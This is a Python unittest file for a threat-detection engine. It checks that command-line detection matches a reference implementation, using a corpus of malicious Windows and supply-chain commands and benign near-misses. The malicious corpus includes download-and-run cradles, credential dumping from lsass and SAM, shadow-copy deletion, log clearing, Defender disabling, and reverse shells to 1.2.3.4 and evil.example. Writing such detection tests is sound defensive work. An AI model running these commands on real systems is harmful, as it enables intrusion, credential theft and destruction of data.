from __future__ import annotations

# ruff: noqa: E402
#
# Regression coverage for cmdline detection: asserts _check_cmdline and
# _scan_cmdline_severity produce exactly the findings/severity a reference
# full-pattern-loop implementation does, across a corpus that hits each pattern
# family plus tricky benign near-misses ("bypass", bare "lsass", "empire", ...).
# Guards the detection surface against future refactors of the cmdline path.

import sys
import tempfile
import types
import unittest
from pathlib import Path
from unittest.mock import patch


class _BaseModel:
    def __init__(self, **kwargs):
        for key, value in kwargs.items():
            setattr(self, key, value)

    @classmethod
    def model_validate(cls, data):
        return cls(**data)

    def model_dump_json(self, indent=None):
        return "{}"


sys.modules.setdefault("keyring", types.SimpleNamespace(
    get_password=lambda *_a, **_k: None,
    set_password=lambda *_a, **_k: None,
    delete_password=lambda *_a, **_k: None,
    errors=types.SimpleNamespace(PasswordDeleteError=Exception),
))
sys.modules.setdefault("pydantic", types.SimpleNamespace(
    BaseModel=_BaseModel,
    Field=lambda default=None, default_factory=None, **_k: default_factory() if default_factory else default,
))

from sqlalchemy import select
from app.detect import engine
from app.detect.rules import SUSPICIOUS_CMDLINE_PATTERNS
from app.store import cases
from app.store import database
from app.store.database import Finding


# Corpus: >=1 line hitting each pattern family + tricky benign near-misses.
_MALICIOUS = [
    "powershell -enc SQBFAFgA",
    "powershell.exe -encodedcommand ZgBv",
    "powershell -nop -w hidden",
    "powershell -noprofile -executionpolicy bypass",
    "iex (new-object net.webclient).downloadstring('http://x/p.ps1')",
    "cmd /c certutil -urlcache -f http://x/y.exe out.exe",
    "certutil.exe -decode a.b c.exe",
    "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";",
    "regsvr32 /s /u /i:http://x/a.sct scrobj.dll",
    "reg save hklm\\sam c:\\t\\sam",
    "reg save hklm\\system c:\\t\\sys",
    "vssadmin delete shadows /all /quiet",
    "wbadmin delete catalog -quiet",
    "bcdedit /set safeboot minimal",
    "wevtutil cl security",
    "clear-eventlog -logname security",
    "mimikatz sekurlsa::logonpasswords",
    'procdump.exe -ma lsass.exe out.dmp',
    "rundll32 comsvcs.dll, minidump 123 out.dmp full",
    "net user hacker P@ss /add",
    "net localgroup administrators hacker /add",
    "schtasks /create /tn evil /tr calc.exe /sc onlogon",
    "wmic process call create calc.exe",
    "wmic /node:target process call create evil.exe",
    "psexec \\\\host -s cmd",
    "ntdsutil ac i ntds ifm create full c:\\t q q",
    "dcsync /user:krbtgt",
    "invoke-mimikatz golden ticket",
    "kerberoast spns",
    "rubeus kerberoast",
    "bloodhound collector",
    "sharphound -c all",
    "cobalt strike beacon",
    "meterpreter reverse_tcp",
    "lazagne all",
    "chisel client 1.2.3.4:80 r:socks",
    "set-mppreference -disablerealtimemonitoring $true",
    "add-mppreference -exclusionpath c:\\temp",
    "sc stop windefend",
    "net stop sense",
    "auditpol /clear /y",
    "auditpol /set /subcategory:logon /success:disable",
    "fsutil usn deletejournal /d c:",
    "netsh advfirewall set allprofiles state off",
    "sdelete64 -p 3 c:\\evil.exe",
    "cipher /w:c:\\",
    "bitsadmin /transfer j /download http://x/y.exe c:\\y.exe",
    "icacls c:\\data /grant everyone:f",
    "powershell -w hidden -c frombase64string('ZgBv')",
    "attrib +h +s c:\\evil.exe",
    # backconnect / tunneling / C2 / RAT
    "powershell $c=new-object net.sockets.tcpclient('1.2.3.4',443);$s=$c.getstream()",
    "powercat -c 1.2.3.4 -p 443 -e cmd.exe",
    "ncat.exe -e cmd.exe 1.2.3.4 4444",
    "netsh interface portproxy add v4tov4 listenport=3389 connectaddress=1.2.3.4",
    "frpc.exe -c frpc.ini",
    "revsocks -connect 1.2.3.4:443 -pass x",
    "poshc2 payload",
    "nimplant beacon",
    "koadic stager",
    "brute ratel badger",
    "pupy connect",
    "asyncrat client",
    # defense evasion / cred access
    "powershell [ref].assembly.gettype('...amsiutils')",
    "powershell etweventwrite patch",
    "reg add hklm\\system\\currentcontrolset\\control\\securityproviders\\wdigest /v uselogoncredential /t reg_dword /d 1",
    "wmic shadowcopy delete /nointeractive",
    "get-wmiobject win32_shadowcopy | remove-wmiobject",
    "mavinject.exe 1234 /injectrunning c:\\evil.dll",
    "certoc.exe -loaddll c:\\evil.dll",
    "conhost.exe --headless powershell -enc ZgBv",
    "nslookup -type=txt evil.example",
    # supply chain / git
    "npm install https://evil.example/pkg.tgz",
    "pip install git+http://evil.example/pkg.git",
    "git clone http://1.2.3.4/repo.git",
    "git config core.hookspath c:\\temp\\hooks",
]

_BENIGN = [
    "notepad.exe c:\\users\\bob\\notes.txt",
    "chrome.exe --profile-directory=Default",
    "bypass the queue at checkout",
    "lsass memory usage is high today",
    "empire state building tour tickets",
    "cobalt blue paint 5 gallons",
    "python train.py --epochs 5 --lr 0.01",
    "svchost.exe -k netsvcs -p",
    "explorer.exe",
    "git commit -m 'fix parser typo in docs'",
    "code --install-extension ms-python.python",
    "the quick brown fox jumps over the lazy dog",
    "msbuild solution.sln /t:Rebuild",
    "docker run -it ubuntu bash",
    "select * from users where name = 'reg'",
]


def _reference_check(text: str):
    """Findings the unmodified _check_cmdline loop would emit (no prefilter)."""
    if not text:
        return [], None
    lower = text.lower()
    findings = []
    top = None
    for regex, technique, description, severity in SUSPICIOUS_CMDLINE_PATTERNS:
        m = regex.search(lower)
        if m:
            matched = m.group(0).strip() or description
            findings.append((description, severity, technique, matched))
            if top is None or engine.SEVERITY_RANK[severity] > engine.SEVERITY_RANK[top]:
                top = severity
    return findings, top


def _reference_scan_severity(text: str):
    if not text:
        return None
    lower = text.lower()
    top = None
    for regex, _t, _d, severity in SUSPICIOUS_CMDLINE_PATTERNS:
        if regex.search(lower) and (top is None or engine.SEVERITY_RANK[severity] > engine.SEVERITY_RANK[top]):
            top = severity
    return top


class CmdlineCorpusTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = tempfile.TemporaryDirectory()
        self.root = Path(self.tmp.name)
        self.patches = [
            patch.object(cases, "get_cases_dir", return_value=self.root),
            patch.object(cases, "case_db_path", side_effect=lambda cid: self.root / cid / "case.db"),
        ]
        for p in self.patches:
            p.start()

    def tearDown(self) -> None:
        database.dispose_all_db_engines()
        for p in reversed(self.patches):
            p.stop()
        self.tmp.cleanup()

    def test_scan_severity_matches_reference(self) -> None:
        for line in _MALICIOUS + _BENIGN:
            self.assertEqual(
                engine._scan_cmdline_severity(line),
                _reference_scan_severity(line),
                f"severity mismatch on {line!r}",
            )

    def test_check_cmdline_findings_match_reference(self) -> None:
        for line in _MALICIOUS + _BENIGN:
            case = cases.create_case("cmd")
            session = cases.get_session(case["id"])
            try:
                existing: set = set()
                top = engine._check_cmdline(session, existing, line, {"entity": line[:50]}, "test")
                session.commit()
                got = sorted(
                    (f.title, f.severity, f.mitre_techniques[0])
                    for f in session.scalars(select(Finding))
                )
            finally:
                session.close()

            ref_findings, ref_top = _reference_check(line)
            ref = sorted((desc, sev, tech) for desc, sev, tech, _frag in ref_findings)
            self.assertEqual(got, ref, f"findings mismatch on {line!r}")
            self.assertEqual(top, ref_top, f"top severity mismatch on {line!r}")

    def test_benign_lines_emit_nothing(self) -> None:
        for line in _BENIGN:
            self.assertIsNone(engine._scan_cmdline_severity(line), f"{line!r} unexpectedly matched")

    def test_parent_child_map_equivalent_to_list(self) -> None:
        # The (parent, child) -> (technique, desc) map must be an exact substitute
        # for a linear scan of SUSPICIOUS_PARENT_CHILD.
        from app.detect.rules import SUSPICIOUS_PARENT_CHILD, SUSPICIOUS_PARENT_CHILD_MAP

        self.assertEqual(len(SUSPICIOUS_PARENT_CHILD_MAP), len(SUSPICIOUS_PARENT_CHILD))
        for parent, child, technique, desc in SUSPICIOUS_PARENT_CHILD:
            self.assertEqual(SUSPICIOUS_PARENT_CHILD_MAP[(parent, child)], (technique, desc))


if __name__ == "__main__":
    unittest.main()
